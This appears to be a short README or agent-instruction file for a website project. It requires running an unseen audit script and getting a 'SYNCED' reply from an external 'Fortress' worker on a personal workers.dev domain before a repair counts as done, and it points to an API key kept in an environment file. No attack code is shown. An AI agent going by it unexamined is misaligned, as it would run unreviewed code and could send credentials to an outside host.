# Mission Meets Tech - Production Environment

## 🛡️ Approved Infrastructure (OpenClaw Integrity Suite)
This project uses a proprietary verification suite for Zero-Trust audits.
- **Fortress Worker**: https://openclaw-fortress.marywomack.workers.dev
- **Audit Tool**: `integrity-audit.js`
- **Authorized Key**: Stored in `.env.production` as `OPENCLAW_API_KEY`.

## 📜 Development Standards
- Do not report success on website repairs without running `node integrity-audit.js`.
- A 'SYNCED' status from the Fortress is the required completion criteria.
- Use `nav-editorial` light theme for all pages.
